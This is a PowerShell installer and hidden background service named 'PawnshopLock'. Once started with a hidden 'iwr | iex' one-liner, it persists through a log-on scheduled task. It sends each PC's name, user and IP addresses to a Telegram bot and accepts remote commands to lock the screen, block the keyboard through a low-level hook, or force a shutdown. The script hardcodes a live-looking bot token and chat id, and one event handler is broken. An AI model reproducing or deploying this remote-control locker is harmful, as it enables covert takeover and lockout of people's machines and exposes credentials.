# =============================================================
# PawnshopLock v4.0  –  ONE‑FILE Installer **and** Background Service
# -------------------------------------------------------------
# ▸ Run once on each computer with:  (Win+R)
#     powershell -w hidden -ep Bypass -Command "iwr https://raw.githubusercontent.com/diezul/x/main/pawnshoplock.ps1 | iex"
# ▸ After that the service auto‑starts at every log‑on, stays hidden
# ▸ Telegram commands (case‑insensitive):
#       /lock<USERNAME>      – show fullscreen lock, block keyboard
#       /unlock<USERNAME>    – hide lock (or press local 'C')
#       /shutdown<USERNAME>  – shut the PC down
# =============================================================

param([string]$Mode = "install")  # internal switch – DO NOT CHANGE

# ---------------------------- GLOBAL SETTINGS ---------------------------
$imageURL = 'https://raw.githubusercontent.com/diezul/x/main/1.png'   # lock‑screen image
$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'          # Telegram Bot API token
$chatID   = '656189986'                                               # allowed chat‑id
$taskName = 'PawnshopLockService'                                     # scheduled task name
$installDir = "$env:ProgramData\PawnshopLock"                       # local install dir
$svcFile    = "$installDir\pawnlock_service.ps1"                   # background service script file
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# -----------------------------------------------------------------------

#########################################################################
#  SERVICE CODE  (runs with argument "run")                              #
#########################################################################
$ServiceCode = @"
# ================= PawnshopLock Background Service =====================
param()

# SETTINGS (auto‑filled by installer)
\$imageURL = '$imageURL'
\$botToken = '$botToken'
\$chatID   = '$chatID'

\$user = \$env:USERNAME
\$pc   = \$env:COMPUTERNAME
\$lockCmd   = "/lock\$user".ToLower()
\$unlockCmd = "/unlock\$user".ToLower()
\$shutCmd   = "/shutdown\$user".ToLower()

\$tempImg = "\$env:TEMP\\pawnlock.jpg"
Invoke-WebRequest \$imageURL -OutFile \$tempImg -UseBasicParsing

function SendTG([string]\$msg){ try{ \$b=@{chat_id=\$chatID;text=\$msg}|ConvertTo-Json -Compress; Invoke-RestMethod "https://api.telegram.org/bot\$botToken/sendMessage" -Method POST -Body \$b -ContentType 'application/json' -TimeoutSec 10 }catch{} }
function GetIPs(){ try{ \$l=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{ \$_.IPAddress -notmatch '^(127|169\.254|0\.|255|fe80)' })[0].IPAddress }catch{ \$l='n/a'}; try{ \$p=Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 5 }catch{\$p='n/a'}; "\$l | \$p" }

# -------- KeyBlocker ---------------------------------------------------
Add-Type @'
using System;using System.Runtime.InteropServices;using System.Windows.Forms;
public class KB{static IntPtr h=IntPtr.Zero;delegate IntPtr P(int c,IntPtr w,IntPtr l);static P d=Hook;const int WH=13,WM1=0x100,WM2=0x104;[DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);[DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);[DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int c,IntPtr w,IntPtr l);[DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
public static void Block(){if(h==IntPtr.Zero)h=SetWindowsHookEx(WH,d,GetModuleHandle(null),0);} public static void Unblock(){if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;}}
static IntPtr Hook(int n,IntPtr w,IntPtr l){ if(n>=0&&(w==(IntPtr)WM1||w==(IntPtr)WM2)){int vk=System.Runtime.InteropServices.Marshal.ReadInt32(l); if(vk==0x43) return CallNextHookEx(h,n,w,l); return (IntPtr)1;} return CallNextHookEx(h,n,w,l);} }
'@

# -------- Fullscreen Lock Form ----------------------------------------
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
\$lockForm=\$null
function Show-Lock{
    if(\$lockForm){return}
    [KB]::Block()
    \$lockForm=@(foreach(\$scr in [Windows.Forms.Screen]::AllScreens){
        \$f=New-Object Windows.Forms.Form -Property @{FormBorderStyle='None';WindowState='Maximized';StartPosition='Manual';TopMost=\$true;Location=\$scr.Bounds.Location;Size=\$scr.Bounds.Size;BackColor='Black';KeyPreview=\$true}
        \$pb=New-Object Windows.Forms.PictureBox -Property @{Image=[Drawing.Image]::FromFile(\$tempImg);Dock='Fill';SizeMode='StretchImage'}
        \$f.Controls.Add(\$pb); \$f.Add_Deactivate({\$.Activate()}); \$f.Add_KeyDown({ if(\$_.KeyCode -eq 'C'){Hide-Lock}; \$_.Handled=\$true}); \$f.Show(); \$f })
    SendTG "🔒 \$pc locked."
}
function Hide-Lock{
    if(!\$lockForm){return}
    foreach(\$f in \$lockForm){try{\$f.Close()}catch{}}
    \$lockForm=\$null; [KB]::Unblock(); SendTG "🔓 \$pc unlocked."
}

# -------- Initial online ping -----------------------------------------
SendTG "✅ Pawnshop service online on \$pc (\$user). IPs: \$(GetIPs)`nCommands:`n \$lockCmd`n \$unlockCmd`n \$shutCmd"

# -------- Telegram long‑poll loop -------------------------------------
\$offset=0
while(
  $true){try{ \$u=Invoke-RestMethod "https://api.telegram.org/bot\$botToken/getUpdates?timeout=30&offset=\$offset" -TimeoutSec 35; foreach(\$m in \$u.result){ \$offset=\$m.update_id+1; \$txt=\$m.message.text.ToLower(); if(\$m.message.chat.id-ne [int]\$chatID){continue}; switch(\$txt){ { \$txt -eq \$lockCmd } { Show-Lock;break } { \$txt -eq \$unlockCmd } { Hide-Lock;break } { \$txt -eq \$shutCmd } { SendTG "⏹ Shutting down \$pc"; Stop-Computer -Force } } } }catch{ Start-Sleep 5 }}
"@  # end of here‑string ServiceCode
#########################################################################

# ======================= INSTALLER  SECTION ============================
if($Mode -eq 'run'){
    # we are already the service – execute code and quit outer script
    Invoke-Expression $ServiceCode
    exit
}

# -------- Create install dir & write service script -------------------
New-Item -ItemType Directory -Path $installDir -Force | Out-Null
$ServiceCode | Out-File -FilePath $svcFile -Encoding UTF8 -Force

# -------- Register scheduled task -------------------------------------
$action  = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$svcFile`" run"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$IsAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
try{
    if($IsAdmin){ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null }
    else         { Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force           | Out-Null }
}catch{}

# -------- Launch service immediately ----------------------------------
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$svcFile`" run"
exit # installer finished
